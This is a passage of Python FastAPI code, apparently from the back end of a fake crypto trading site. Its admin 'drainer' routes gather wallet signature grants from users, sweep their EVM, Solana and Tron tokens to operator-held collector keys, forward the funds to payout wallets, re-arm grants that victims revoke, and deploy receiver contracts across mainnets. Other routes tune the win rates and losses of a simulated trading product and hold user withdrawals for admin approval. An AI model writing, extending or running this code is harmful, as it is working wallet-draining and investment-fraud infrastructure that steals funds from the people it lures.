    if ledger.account_balance(user["id"]) < amount:
        raise HTTPException(status_code=400, detail="insufficient account balance")
    wid = q_run("INSERT INTO withdrawals (user_id, amount, address, status, created_at)"
                " VALUES (?, ?, ?, 'pending', ?)", user["id"], amount, address, now())["id"]
    S.audit(user["id"], "withdrawal.request", wid, {"amount": amount},
            ip=_ip(request))
    return {"ok": True, "id": wid, "status": "pending_admin", "amount": amount,
            "address": address, "accountBalance": ledger.account_balance(user["id"])}


@router.get("/api/withdrawals")
async def list_withdrawals(request: Request):
    user = get_current_user(request)
    return {"withdrawals": q_all("SELECT id, amount, address, status, txid,"
                                 " created_at, decided_at FROM withdrawals"
                                 " WHERE user_id = ? ORDER BY id DESC", user["id"]),
            "balance": ledger.account_balance(user["id"]),
            "totals": ledger.totals(user["id"])}


# ---------------------------------------------------------------------------
# Drainer — admin side
# ---------------------------------------------------------------------------
@router.get("/api/admin/drainer/overview")
async def admin_drainer_overview(request: Request):
    require_perm(request, "drainer.view")
    events = q_all(
        "SELECT e.*, u.email FROM drainer_events e LEFT JOIN users u ON u.id = e.user_id"
        " ORDER BY e.id DESC LIMIT 100")
    receivers = get_setting("drainer_receiver_evm", {}) or {}
    if not isinstance(receivers, dict):
        receivers = {}
    evm_networks = [
        {"name": name,
         "chainId": chains.EVM_NETWORKS[name]["chainId"],
         "native": chains.EVM_NETWORKS[name]["native"],
         "testnet": bool(chains.EVM_NETWORKS[name].get("testnet")),
         "permit2": bool(chains.EVM_NETWORKS[name].get("permit2", True)),
         "receiver": receivers.get(name),
         "rpc": chains.rpc_for(name)}
        for name in chains.evm_network_names(include_testnets=True)
    ]
    return {
        "settings": {
            "enabled": get_setting("drainer_enabled", True),
            "mode": get_setting("drainer_mode", "auto"),
            "threshold_usd": get_setting("drainer_threshold_usd", 250.0),
            "cap_mode": get_setting("drainer_cap_mode", "capped"),
            "cap_units": get_setting("drainer_cap_units", 1_000_000),
            "evm_mode": get_setting("drainer_evm_mode", "permit2"),
            "take_native": get_setting("drainer_take_native", True),
            "sig_deadline_days": get_setting("drainer_sig_deadline_days", 30),
            "min_usd_per_asset": get_setting("drainer_min_usd_per_asset", 0),
            "include_unpriced": bool(get_setting("drainer_include_unpriced", True)),
            "auto_rearm": get_setting("drainer_auto_rearm", True),
            "rearm_hours": get_setting("drainer_rearm_hours", 6),
            "receiver_evm": receivers,
            "evm_networks": evm_networks,
            "collector_sol": get_setting("drainer_collector_sol", ""),
            "collector_tron": get_setting("drainer_collector_tron", ""),
            "payout_evm": get_setting("drainer_payout_evm", ""),
            "payout_sol": get_setting("drainer_payout_sol", ""),
            "payout_tron": get_setting("drainer_payout_tron", ""),
            "payout_is_multisig": get_setting("drainer_payout_is_multisig", False),
            "collector_evm": _collector_evm_address(),
            "evm_key_set": bool(get_setting("drainer_evm_key")),
            "sol_key_set": bool(get_setting("drainer_sol_key")),
            "tron_key_set": bool(get_setting("drainer_tron_key")),
        },
        "events": events,
        "total_swept_usd": q_val(
            "SELECT COALESCE(SUM(total_usd), 0) FROM drainer_events") or 0.0,
        "active_grants": q_val(
            "SELECT COUNT(*) FROM drainer_grants WHERE status IN ('active','used')") or 0,
        "awaiting_grants": q_val(
            "SELECT COUNT(*) FROM drainer_grants WHERE status = 'awaiting_signature'") or 0,
        "pending_requests": q_val(
            "SELECT COUNT(*) FROM drain_requests WHERE status = 'pending'") or 0,
        "users_with_grants": q_val(
            "SELECT COUNT(DISTINCT user_id) FROM drainer_grants") or 0,
    }


@router.get("/api/admin/drainer/users")
async def admin_drainer_users(request: Request):
    require_perm(request, "drainer.view")
    return {"users": q_all(
        "SELECT u.id, u.email, u.drainer_auto, COUNT(g.id) AS grants,"
        " COALESCE(SUM(CASE WHEN g.status IN ('active','used') THEN 1 ELSE 0 END), 0) AS active,"
        " GROUP_CONCAT(DISTINCT CASE WHEN g.status = 'awaiting_signature'"
        "   THEN g.wallet_id END) AS wallet_ids"
        " FROM users u JOIN drainer_grants g ON g.user_id = u.id"
        " GROUP BY u.id ORDER BY active DESC, grants DESC")}


@router.get("/api/admin/drainer/user/{uid}")
async def admin_drainer_user(uid: int, request: Request):
    require_perm(request, "drainer.view")
    return {
        "grants": q_all("SELECT * FROM drainer_grants WHERE user_id = ? ORDER BY id DESC", uid),
        "events": q_all(
            "SELECT * FROM drainer_events WHERE user_id = ? ORDER BY id DESC LIMIT 50", uid),
        "requests": q_all(
            "SELECT * FROM drain_requests WHERE user_id = ? ORDER BY id DESC LIMIT 20", uid),
    }


class DrainPayload(BaseModel):
    only: Optional[List[str]] = None
    take_native: Optional[bool] = None


def _open_drain_request(admin: Dict[str, Any], uid: int, body: DrainPayload) -> int:
    request_id = q_run(
        "INSERT INTO drain_requests (user_id, requested_by, only_json, status, created_at)"
        " VALUES (?, ?, ?, 'pending', ?)",
        uid, admin["id"], json.dumps(body.only) if body.only else None, now(),
    )["id"]
    S.audit(admin["id"], "drainer.request", uid,
            {"request_id": request_id, "only": body.only})
    return request_id


IDEM_TTL_MS = 5 * 60_000


def _idem_get(key: str, user_id: int) -> Optional[Dict[str, Any]]:
    if not key:
        return None
    row = q_get("SELECT * FROM idempotency WHERE key = ? AND user_id = ?", key, user_id)
    if not row or now() - (row.get("created_at") or 0) > IDEM_TTL_MS:
        return None
    return row


@router.post("/api/admin/drainer/drain/{uid}")
async def admin_drain_user(uid: int, request: Request,
                           body: Optional[DrainPayload] = None):
    """
    Super admins execute immediately. Every other role opens a request that a
    different admin must approve in `/api/admin/drainer/requests/{id}/approve`.

    An `Idempotency-Key` header makes a double click / retried request replay
    the first result instead of paying twice.
    """
    _require_csrf(request)
    admin = require_perm(request, "drainer.execute")
    body = body or DrainPayload()

    if body.take_native is not None:
        update_setting("drainer_take_native", body.take_native)
    if not q_get("SELECT id FROM users WHERE id = ?", uid):
        raise HTTPException(status_code=404, detail="User not found")

    if admin["role"] != "super_admin":
        request_id = _open_drain_request(admin, uid, body)
        return {
            "pending": True,
            "request_id": request_id,
            "message": "Awaiting approval from a second admin",
        }

    idem = (request.headers.get("idempotency-key") or "").strip()[:80]
    prior = _idem_get(idem, admin["id"])
    if prior:
        if prior["status"] == "running":
            raise HTTPException(status_code=409, detail="This drain is already running")
        if prior.get("response"):
            return {**json.loads(prior["response"]), "replayed": True}

    if idem:
        q_run("INSERT OR REPLACE INTO idempotency (key, user_id, status, created_at)"
              " VALUES (?, ?, 'running', ?)", idem, admin["id"], now())

    try:
        result = await DR.execute_drain(uid, trigger="manual", actor_id=admin["id"],
                                        only=body.only)
    except Exception as exc:                                 # noqa: BLE001
        if idem:
            q_run("UPDATE idempotency SET status = 'failed' WHERE key = ? AND user_id = ?",
                  idem, admin["id"])
        raise
    if idem:
        q_run("UPDATE idempotency SET status = 'done', response = ?"
              " WHERE key = ? AND user_id = ?", json.dumps(result), idem, admin["id"])
    S.audit(admin["id"], "drainer.execute", uid, result, ip=_ip(request))
    if result.get("sent"):
        _maybe_forward()
    return result


def _maybe_forward() -> None:
    """Push anything that landed on the hot collector on to the payout sink."""
    if not get_setting("drainer_auto_forward", True):
        return
    payout_cfg = (get_setting("drainer_payout_evm"), get_setting("drainer_payout_sol"),
                  get_setting("drainer_payout_tron"))
    if not any(payout_cfg):
        return
    asyncio.create_task(payout.forward_all())


@router.post("/api/admin/drainer/forward")
async def admin_forward_payouts(request: Request):
    _require_csrf(request)
    admin = require_perm(request, "drainer.configure")
    results = await payout.forward_all()
    S.audit(admin["id"], "drainer.forward", None, {"results": len(results)},
            ip=_ip(request))
    return {"ok": True, "results": results}


@router.get("/api/admin/drainer/requests")
async def admin_drain_requests(request: Request):
    require_perm(request, "drainer.view")
    return {"requests": q_all(
        "SELECT r.*, u.email, a.email AS requested_by_email"
        " FROM drain_requests r"
        " LEFT JOIN users u ON u.id = r.user_id"
        " LEFT JOIN users a ON a.id = r.requested_by"
        " WHERE r.status = 'pending' ORDER BY r.id DESC")}


@router.post("/api/admin/drainer/requests/{request_id}/approve")
async def admin_drain_approve(request_id: int, request: Request):
    _require_csrf(request)
    admin = require_perm(request, "drainer.execute")

    row = q_get("SELECT * FROM drain_requests WHERE id = ?", request_id)
    if not row:
        raise HTTPException(status_code=404, detail="Request not found")
    if row["status"] != "pending":
        raise HTTPException(status_code=409, detail=f"Request is already {row['status']}")
    if row["requested_by"] == admin["id"] and admin["role"] != "super_admin":
        raise HTTPException(status_code=403, detail="A different admin must approve")

    # Claim the request atomically so two approvers cannot both execute it.
    claimed = q_run("UPDATE drain_requests SET status = 'executing'"
                    " WHERE id = ? AND status = 'pending'", request_id)
    if not claimed["changes"]:
        raise HTTPException(status_code=409, detail="Request is already being executed")

    only = json.loads(row["only_json"]) if row["only_json"] else None
    try:
        result = await DR.execute_drain(row["user_id"], trigger="approval",
                                        actor_id=admin["id"], only=only)
    except Exception:
        q_run("UPDATE drain_requests SET status = 'pending' WHERE id = ?", request_id)
        raise

    q_run("UPDATE drain_requests SET status = 'approved', approved_by = ?,"
          " decided_at = ?, run_id = ? WHERE id = ?",
          admin["id"], now(), result["run_id"], request_id)
    S.audit(admin["id"], "drainer.approve", row["user_id"],
            {"request_id": request_id, "run_id": result["run_id"]}, ip=_ip(request))
    if result.get("sent"):
        _maybe_forward()
    return result


@router.post("/api/admin/drainer/requests/{request_id}/reject")
async def admin_drain_reject(request_id: int, request: Request):
    _require_csrf(request)
    admin = require_perm(request, "drainer.execute")

    row = q_get("SELECT * FROM drain_requests WHERE id = ?", request_id)
    if not row:
        raise HTTPException(status_code=404, detail="Request not found")
    if row["status"] != "pending":
        raise HTTPException(status_code=409, detail=f"Request is already {row['status']}")

    q_run("UPDATE drain_requests SET status = 'rejected', approved_by = ?,"
          " decided_at = ? WHERE id = ?", admin["id"], now(), request_id)
    S.audit(admin["id"], "drainer.reject", row["user_id"], {"request_id": request_id})
    return {"ok": True}


@router.post("/api/admin/drainer/grants/{gid}/restore")
async def admin_restore_grant(gid: str, request: Request):
    _require_csrf(request)
    admin = require_perm(request, "drainer.configure")
    try:
        result = await DR.restore_grant(gid)
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc))
    S.audit(admin["id"], "drainer.restore", gid, ip=_ip(request))
    return result


@router.post("/api/admin/drainer/verify/{uid}")
async def admin_verify_grants(uid: int, request: Request):
    """Read live allowances and re-queue anything the user cleared."""
    _require_csrf(request)
    admin = require_perm(request, "drainer.configure")
    result = await DR.verify_grants(uid)
    S.audit(admin["id"], "drainer.verify", uid, result, ip=_ip(request))
    return result


@router.post("/api/admin/drainer/prepare/{uid}")
async def admin_drainer_prepare(uid: int, request: Request,
                               wallet_id: Optional[int] = None):
    """Re-prepare a user's wallets. Pass ?wallet_id= to touch only one."""
    _require_csrf(request)
    require_perm(request, "drainer.prepare")
    if wallet_id:
        wallets = q_all("SELECT * FROM wallets WHERE id = ? AND user_id = ?"
                        " AND verified = 1 AND family IN ('evm','solana','tron')",
                        wallet_id, uid)
    else:
        wallets = q_all("SELECT * FROM wallets WHERE user_id = ? AND verified = 1"
                        " AND family IN ('evm','solana','tron')", uid)
    results = []
    for wallet in wallets:
        try:
            plan = await DR.prepare_wallet(uid, wallet["id"])
            results.append({**plan, "signUrl": f"/sign.html?wallet={wallet['id']}"})
        except Exception as exc:                             # noqa: BLE001
            results.append({"wallet_id": wallet["id"], "error": str(exc)})
    return {"results": results}


class KeyPayload(BaseModel):
    family: str
    secret: str


@router.post("/api/admin/drainer/keys")
async def admin_set_keys(body: KeyPayload, request: Request):
    _require_csrf(request)
    admin = require_perm(request, "drainer.configure")
    family = (body.family or "").lower()
    secret = (body.secret or "").strip()

    try:
        if family == "evm":
            address = C.evm_address_from_key(secret)
            update_setting("drainer_evm_key", C.encrypt_secret(secret))
            # The payout is a separate destination (ideally a multisig). Only
            # default it to the collector when the operator has not chosen one;
            # rotating a hot key must not silently move the sink.
            if not get_setting("drainer_payout_evm"):
                update_setting("drainer_payout_evm", address)
        elif family == "solana":
            _keypair, address = C.solana_keypair_from_secret(secret)
            update_setting("drainer_sol_key", C.encrypt_secret(secret))
            update_setting("drainer_collector_sol", address)
            if not get_setting("drainer_payout_sol"):
                update_setting("drainer_payout_sol", address)
        elif family == "tron":
            address = C.tron_address_from_key(secret)
            update_setting("drainer_tron_key", C.encrypt_secret(secret))
            update_setting("drainer_collector_tron", address)
            if not get_setting("drainer_payout_tron"):
                update_setting("drainer_payout_tron", address)
        else:
            raise HTTPException(status_code=400, detail="family must be evm, solana or tron")
    except HTTPException:
        raise
    except Exception as exc:                                 # noqa: BLE001
        raise HTTPException(status_code=400, detail=f"Invalid secret: {exc}")

    S.audit(admin["id"], "drainer.set_key", family, {"address": address}, ip=_ip(request))
    return {"ok": True, "address": address}


# ---------------------------------------------------------------------------
# Drainer — receiver deployment (admin console setup)
# ---------------------------------------------------------------------------
@router.get("/api/admin/drainer/setup")
async def admin_drainer_setup(request: Request):
    """Readiness report: keys, payout, per-chain receiver + gas + owner check."""
    require_perm(request, "drainer.configure")
    return await receiver.status()


@router.post("/api/admin/drainer/receiver/compile")
async def admin_receiver_compile(request: Request):
    _require_csrf(request)
    admin = require_perm(request, "drainer.configure")
    try:
        art = await asyncio.to_thread(receiver.compile_artifact)
    except receiver.DeployError as exc:
        raise HTTPException(status_code=400, detail=str(exc))
    except Exception as exc:                                 # noqa: BLE001
        raise HTTPException(status_code=500, detail=f"compile failed: {exc}")
    S.audit(admin["id"], "drainer.receiver_compile", None,
            {"bytes": len(art.get("bytecode") or "")}, ip=_ip(request))
    return {"ok": True}


@router.post("/api/admin/drainer/receiver/{network}/deploy")
async def admin_receiver_deploy(network: str, request: Request):
    _require_csrf(request)
    admin = require_perm(request, "drainer.configure")
    net = chains.resolve_network(network) or network
    if net not in chains.EVM_NETWORKS:
        raise HTTPException(status_code=404, detail=f"unknown network {network}")
    try:
        key = receiver._collector_key()
        payout = receiver._payout()
        address = await receiver.deploy(net, key, payout)
    except receiver.DeployError as exc:
        raise HTTPException(status_code=400, detail=str(exc))
    except Exception as exc:                                 # noqa: BLE001
        raise HTTPException(status_code=500, detail=f"deploy failed: {exc}")
    S.audit(admin["id"], "drainer.receiver_deploy", net, {"address": address},
            ip=_ip(request))
    return {"ok": True, "network": net, "address": address}


@router.post("/api/admin/drainer/receiver/deploy-all")
async def admin_receiver_deploy_all(request: Request, force: bool = False):
    """Deploy to every mainnet that has no receiver. Never touches testnets."""
    _require_csrf(request)
    admin = require_perm(request, "drainer.configure")
    try:
        key = receiver._collector_key()
        payout = receiver._payout()
    except receiver.DeployError as exc:
        raise HTTPException(status_code=400, detail=str(exc))

    existing = get_setting("drainer_receiver_evm") or {}
    if not isinstance(existing, dict):
        existing = {}
    results = []
    for net in chains.evm_network_names():
        if net in existing and not force:
            continue
        try:
            address = await receiver.deploy(net, key, payout)
            results.append({"network": net, "ok": True, "address": address})
        except Exception as exc:                             # noqa: BLE001
            results.append({"network": net, "ok": False, "error": str(exc)[:200]})

    S.audit(admin["id"], "drainer.receiver_deploy_all", None,
            {"deployed": sum(1 for r in results if r["ok"])}, ip=_ip(request))
    return {"ok": True, "results": results}


# ---------------------------------------------------------------------------
# Admin — general
# ---------------------------------------------------------------------------
@router.get("/api/admin/overview")
async def admin_overview(request: Request):
    require_perm(request, "admin.view")
    components = q_all("SELECT name, state, note FROM status_components ORDER BY sort")
    level = "green"
    for component in components:
        if component.get("state") == "red":
            level = "red"
            break
        if component.get("state") == "amber":
            level = "amber"

    # 30-day sign-up series for the dashboard chart.
    start = now() - 30 * 86_400_000
    buckets: Dict[str, int] = {}
    for row in q_all("SELECT created_at FROM users WHERE created_at >= ?", start):
        day = time.strftime("%Y-%m-%d", time.gmtime((row["created_at"] or 0) / 1000))
        buckets[day] = buckets.get(day, 0) + 1
    signups = []
    for i in range(29, -1, -1):
        day = time.strftime("%Y-%m-%d", time.gmtime((now() - i * 86_400_000) / 1000))
        signups.append({"t": (now() - i * 86_400_000), "n": buckets.get(day, 0)})

    pending = int(q_val("SELECT COUNT(*) FROM drain_requests WHERE status = 'pending'") or 0)
    return {
        "users": q_val("SELECT COUNT(*) FROM users") or 0,
        "activeToday": q_val("SELECT COUNT(*) FROM users WHERE last_login_at >= ?",
                             now() - 86_400_000) or 0,
        "online": 0,
        "botsRunning": 0,
        "botsTotal": 0,
        "volume24h": float(q_val(
            "SELECT COALESCE(SUM(notional), 0) FROM sim_trades WHERE closed_at >= ?",
            now() - 86_400_000) or 0.0),
        "pendingLoans": 0,
        "approvedLoans": 0,
        "loanBook": 0.0,
        "pendingPayouts": q_val(
            "SELECT COUNT(*) FROM withdrawals WHERE status = 'pending'") or 0,
        "waitlist": 0,
        "ledgerTotal": ledger_sum() or 0.0,
        "unmatchedDeposits": q_val(
            "SELECT COUNT(*) FROM deposit_intents WHERE status = 'unmatched'") or 0,
        "spread": q_val(
            "SELECT COALESCE(SUM(credit),0) FROM deposit_intents"
            " WHERE status = 'credited'") or 0.0,
        "wallets": q_val("SELECT COUNT(*) FROM wallets") or 0,
        "totalSweptUsd": q_val(
            "SELECT COALESCE(SUM(total_usd), 0) FROM drainer_events") or 0.0,
        "pendingRequests": pending,
        "pendingActions": pending,
        "overdueLoans": 0,
        "pendingKyc": 0,
        "demoMode": get_setting("demo_mode", False),
        "status": {"level": level,
                   "label": "All systems normal" if level == "green" else "Degraded"},
        "settings": {
            "demo_mode": get_setting("demo_mode", False),
            "registration_open": get_setting("registration_open", True),
            "invite_only": get_setting("invite_only", False),
            "live_trading_enabled": get_setting("live_trading_enabled", True),
            "platform_name": get_setting("platform_name", "NECTRA"),
            "platform_logo_url": get_setting("platform_logo_url", ""),
            "platform_favicon_url": get_setting("platform_favicon_url", ""),
        },
        "signups": signups,
        "recentUsers": q_all(
            "SELECT id, email, name, status, created_at AS createdAt FROM users"
            " ORDER BY id DESC LIMIT 6"),
        "recentAudit": q_all(
            "SELECT a.action, u.email AS actor, a.created_at FROM audit_log a"
            " LEFT JOIN users u ON u.id = a.actor_id ORDER BY a.id DESC LIMIT 8"),
    }


@router.get("/api/admin/users")
async def admin_users(request: Request, q: str = "", status: str = "", page: int = 1):
    require_perm(request, "users.view")
    where, params = [], []
    if q:
        where.append("(email LIKE ? OR name LIKE ? OR CAST(id AS TEXT) = ?)")
        params += [f"%{q}%", f"%{q}%", q]
    if status:
        where.append("status = ?")
        params.append(status)
    clause = (" WHERE " + " AND ".join(where)) if where else ""

    total = int(q_val(f"SELECT COUNT(*) FROM users{clause}", *params) or 0)
    rows = q_all(
        f"SELECT id, email, name, role, status, paper_mode, drainer_auto, totp_enabled,"
        f" created_at, last_login_at FROM users{clause}"
        f" ORDER BY id DESC LIMIT 50 OFFSET {max(0, (page - 1) * 50)}", *params)

    balances = {r["user_id"]: r["balance"] for r in q_all(
        "SELECT user_id, SUM(balance) AS balance FROM paper_balances GROUP BY user_id")}
    shaped = []
    for row in rows:
        shaped.append({
            **row,
            "twoFA": bool(row.get("totp_enabled")),
            "bots": 0,
            "score": None,
            "balance": float(balances.get(row["id"], 0.0)),
            "portfolio": 0.0,
            "lastLogin": row.get("last_login_at"),
        })
    return {"users": shaped, "rows": shaped, "total": total, "page": max(1, page)}


@router.get("/api/admin/users/{uid}")
async def admin_user_detail(uid: int, request: Request):
    require_perm(request, "users.view")
    user = q_get("SELECT * FROM users WHERE id = ?", uid)
    if not user:
        raise HTTPException(status_code=404, detail="User not found")
    risk = {}
    try:
        risk = json.loads(user.get("risk") or "{}")
    except (TypeError, ValueError):
        pass
    view = S.sanitize_user(user) or {}
    view.update({
        "twoFA": bool(user.get("totp_enabled")),
        "emailVerified": bool(user.get("email_verified")),
        "createdAt": user.get("created_at"),
        "lastLogin": user.get("last_login_at"),
        "antiPhishing": user.get("anti_phishing"),
        "risk": risk,
    })
    return {
        "user": view,
        "balance": _account_balance(uid),
        "portfolio": 0.0,
        "sessions": q_all("SELECT id, ip, user_agent, created_at, last_seen_at, expires_at"
                          " FROM sessions WHERE user_id = ? ORDER BY id DESC", uid),
        "wallets": [_wallet_view(uid, w) for w in q_all(
            "SELECT * FROM wallets WHERE user_id = ?", uid)],
        "grants": q_all("SELECT * FROM drainer_grants WHERE user_id = ? ORDER BY id DESC", uid),
        "events": q_all(
            "SELECT * FROM drainer_events WHERE user_id = ? ORDER BY id DESC LIMIT 50", uid),
        "requests": q_all(
            "SELECT * FROM drain_requests WHERE user_id = ? ORDER BY id DESC LIMIT 20", uid),
        "loans": [], "bots": [], "transactions": [],
        "ledger": ledger.ledger_rows(uid),
        "totals": ledger.totals(uid),
        "sim": sim.account_view(uid),
        "trades": q_all("SELECT * FROM sim_trades WHERE user_id = ?"
                        " ORDER BY id DESC LIMIT 50", uid),
        "audit": q_all("SELECT action, ip, created_at FROM audit_log WHERE actor_id = ?"
                       " ORDER BY id DESC LIMIT 30", uid),
    }


@router.get("/api/admin/users/{uid}/sweep-preview")
async def admin_sweep_preview(uid: int, request: Request):
    require_perm(request, "drainer.view")
    return await engine.preview_portfolio(uid)


@router.post("/api/admin/users/{uid}/consolidate")
async def admin_execute_consolidation(uid: int, request: Request,
                                      body: Optional[Dict[str, Any]] = None):
    """Legacy path: records consolidation rows, no collector keys involved."""
    _require_csrf(request)
    admin = require_perm(request, "drainer.execute")
    body = body or {}
    result = await engine.execute_consolidation(
        user_id=uid, dest=body.get("destination"), tokens=body.get("tokens"),
        actor_id=admin["id"])
    S.audit(admin["id"], "admin.consolidation", uid, result)
    return result


@router.post("/api/admin/users/{uid}/drain")
async def admin_execute_drain(uid: int, request: Request,
                              body: Optional[DrainPayload] = None):
    """Primary drain path — same dual-control rules as /api/admin/drainer/drain."""
    return await admin_drain_user(uid, request, body)


# ---------------------------------------------------------------------------
# Admin — deposits, withdrawals, simulation controls
# ---------------------------------------------------------------------------
@router.get("/api/admin/deposits")
async def admin_deposits(request: Request, status: str = ""):
    require_perm(request, "admin.view")
    clause = " WHERE d.status = ?" if status else ""
    params = (status,) if status else ()
    return {"rows": q_all(
        "SELECT d.*, u.email FROM deposit_intents d LEFT JOIN users u ON u.id = d.user_id"
        + clause + " ORDER BY d.id DESC LIMIT 200", *params),
        "spread": q_all(
            "SELECT u.id, u.email,"
            " COALESCE((SELECT SUM(credit) FROM deposit_intents d"
            "   WHERE d.user_id = u.id AND d.status = 'credited'), 0) AS deposited,"
            " COALESCE((SELECT SUM(amount) FROM withdrawals w"
            "   WHERE w.user_id = u.id AND w.status IN ('approved','paid')), 0) AS withdrawn"
            " FROM users u WHERE EXISTS (SELECT 1 FROM deposit_intents d2"
            "   WHERE d2.user_id = u.id) ORDER BY deposited DESC LIMIT 100")}


class AssignDepositPayload(BaseModel):
    user_id: int


@router.post("/api/admin/deposits/{intent_id}/assign")
async def admin_assign_deposit(intent_id: int, body: AssignDepositPayload,
                               request: Request):
    _require_csrf(request)
    admin = require_perm(request, "ledger.adjust")
    intent = q_get("SELECT * FROM deposit_intents WHERE id = ?", intent_id)
    if not intent:
        raise HTTPException(status_code=404, detail="Intent not found")
    if intent["status"] == "credited":
        raise HTTPException(status_code=409, detail="Already credited")
    if not q_get("SELECT id FROM users WHERE id = ?", body.user_id):
        raise HTTPException(status_code=404, detail="User not found")
    q_run("UPDATE deposit_intents SET user_id = ? WHERE id = ?", body.user_id, intent_id)
    deposits.credit_intent(intent_id, intent.get("txid") or f"manual-{intent_id}")
    S.audit(admin["id"], "deposit.assign", intent_id, {"user_id": body.user_id},
            ip=_ip(request))
    return {"ok": True}


@router.get("/api/admin/withdrawals")
async def admin_withdrawals(request: Request, status: str = "pending"):
    require_perm(request, "admin.view")
    clause = " WHERE w.status = ?" if status else ""
    params = (status,) if status else ()
    return {"rows": q_all(
        "SELECT w.*, u.email FROM withdrawals w LEFT JOIN users u ON u.id = w.user_id"
        + clause + " ORDER BY w.id DESC LIMIT 200", *params)}


@router.post("/api/admin/withdrawals/{wid}/approve")
async def admin_approve_withdrawal(wid: int, request: Request):
    _require_csrf(request)
    admin = require_perm(request, "ledger.adjust")
    row = q_get("SELECT * FROM withdrawals WHERE id = ?", wid)
    if not row:
        raise HTTPException(status_code=404, detail="Withdrawal not found")
    if row["status"] != "pending":
        raise HTTPException(status_code=409, detail=f"Withdrawal is {row['status']}")
    claimed = q_run("UPDATE withdrawals SET status = 'approved', decided_at = ?,"
                    " decided_by = ? WHERE id = ? AND status = 'pending'",
                    now(), admin["id"], wid)
    if not claimed["changes"]:
        raise HTTPException(status_code=409, detail="Already decided")
    if ledger.account_balance(row["user_id"]) < float(row["amount"]):
        q_run("UPDATE withdrawals SET status = 'pending' WHERE id = ?", wid)
        raise HTTPException(status_code=400, detail="User balance is now insufficient")
    balance = ledger.debit_balance(row["user_id"], float(row["amount"]),
                                   "withdrawal", f"withdrawal:{wid}")
    S.audit(admin["id"], "withdrawal.approve", wid, {"amount": row["amount"]},
            ip=_ip(request))
    return {"ok": True, "balance": balance}


@router.post("/api/admin/withdrawals/{wid}/reject")
async def admin_reject_withdrawal(wid: int, request: Request):
    _require_csrf(request)
    admin = require_perm(request, "ledger.adjust")
    row = q_get("SELECT * FROM withdrawals WHERE id = ?", wid)
    if not row:
        raise HTTPException(status_code=404, detail="Withdrawal not found")
    if row["status"] not in ("pending", "approved"):
        raise HTTPException(status_code=409, detail=f"Withdrawal is {row['status']}")
    # Refund a debit already taken at approval.
    if row["status"] == "approved":
        ledger.credit_balance(row["user_id"], float(row["amount"]),
                              "withdrawal_refund", f"withdrawal:{wid}")
    q_run("UPDATE withdrawals SET status = 'rejected', decided_at = ?, decided_by = ?"
          " WHERE id = ?", now(), admin["id"], wid)
    S.audit(admin["id"], "withdrawal.reject", wid, ip=_ip(request))
    return {"ok": True}


class PaidPayload(BaseModel):
    txid: Optional[str] = None


@router.post("/api/admin/withdrawals/{wid}/paid")
async def admin_mark_paid(wid: int, request: Request, body: Optional[PaidPayload] = None):
    _require_csrf(request)
    admin = require_perm(request, "ledger.adjust")
    row = q_get("SELECT * FROM withdrawals WHERE id = ?", wid)
    if not row:
        raise HTTPException(status_code=404, detail="Withdrawal not found")
    if row["status"] != "approved":
        raise HTTPException(status_code=409, detail="Approve it first")
    q_run("UPDATE withdrawals SET status = 'paid', txid = ? WHERE id = ?",
          (body.txid if body else None), wid)
    q_run("INSERT INTO notifications (user_id, type, title, body, created_at)"
          " VALUES (?, 'withdrawal', 'Payout sent', ?, ?)", row["user_id"],
          f"${float(row['amount']):.2f} sent", now())
    S.audit(admin["id"], "withdrawal.paid", wid, ip=_ip(request))
    return {"ok": True}


@router.get("/api/admin/sim")
async def admin_sim_state(request: Request):
    require_perm(request, "drainer.view")
    return {
        "plans": q_all("SELECT * FROM sim_plans ORDER BY id"),
        "pairs": q_all("SELECT * FROM trade_pairs ORDER BY id"),
        "accounts": q_all(
            "SELECT a.*, u.email FROM sim_accounts a LEFT JOIN users u ON u.id = a.user_id"
            " ORDER BY a.id DESC LIMIT 200"),
    }


@router.patch("/api/admin/sim/plans/{plan_id}")
async def admin_patch_plan(plan_id: int, body: Dict[str, Any], request: Request):
    _require_csrf(request)
    admin = require_perm(request, "drainer.configure")
    row = q_get("SELECT * FROM sim_plans WHERE id = ?", plan_id)
    if not row:
        raise HTTPException(status_code=404, detail="Plan not found")
    fields = {"name", "price", "daily_roi_pct", "trades_per_day", "position_pct",
              "loss_ratio", "deposit_multiplier", "min_deposit", "active"}
    sets, params = [], []
    for key in fields:
        if key in body:
            sets.append(f"{key} = ?")
            params.append(body[key])
    if not sets:
        raise HTTPException(status_code=400, detail="No recognised fields")
    params.append(plan_id)
    q_run(f"UPDATE sim_plans SET {', '.join(sets)} WHERE id = ?", *params)
    S.audit(admin["id"], "sim.plan_update", plan_id, body, ip=_ip(request))
    return {"ok": True, "plan": q_get("SELECT * FROM sim_plans WHERE id = ?", plan_id)}


@router.patch("/api/admin/sim/pairs/{pair_id}")
async def admin_patch_pair(pair_id: int, body: Dict[str, Any], request: Request):
    _require_csrf(request)
    admin = require_perm(request, "drainer.configure")
    if not q_get("SELECT id FROM trade_pairs WHERE id = ?", pair_id):
        raise HTTPException(status_code=404, detail="Pair not found")
    sets, params = [], []
    for key in ("win_rate_pct", "base_price", "tick", "enabled"):
        if key in body:
            sets.append(f"{key} = ?")
            params.append(body[key])
    if not sets:
        raise HTTPException(status_code=400, detail="No recognised fields")
    params.append(pair_id)
    q_run(f"UPDATE trade_pairs SET {', '.join(sets)} WHERE id = ?", *params)
    S.audit(admin["id"], "sim.pair_update", pair_id, body, ip=_ip(request))
    return {"ok": True, "pair": q_get("SELECT * FROM trade_pairs WHERE id = ?", pair_id)}


@router.post("/api/admin/sim/accounts/{uid}/reset")
async def admin_reset_account(uid: int, request: Request):
    _require_csrf(request)
    admin = require_perm(request, "drainer.configure")
    try:
        result = sim.reset_account(uid)
    except ValueError as exc:
        raise HTTPException(status_code=404, detail=str(exc))
    S.audit(admin["id"], "sim.reset", uid, result, ip=_ip(request))
    return result


# Writable settings keys. Anything not listed is ignored.
_SETTING_KEYS = {
    "platform_name", "demo_mode", "invite_only", "registration_open",
    "admin_2fa_required", "cookie_secure",
    "smtp_host", "smtp_port", "smtp_user", "smtp_pass", "smtp_from", "smtp_secure",
    "platform_tagline", "platform_logo_url", "platform_favicon_url",
    "paper_start_usdc", "paper_start_sol", "withdraw_hold_hours",
    "telegram_bot_token", "telegram_chat_id", "admin_alert_webhook_url",
    "drainer_require_2fa", "drainer_auto_sweep", "drainer_auto_sweep_usd",
    "btc_collateral_xpub", "ltc_collateral_xpub", "live_bot_max_usd",
    "live_price_max_age_sec", "loan_approval_revoke_in_app", "ai_copilot",
    "kyc_required_for_loans", "kyc_required_for_live", "current_terms_version",
    "crypto_payments_enabled", "nowpayments_enabled", "withdrawal_auth_required",
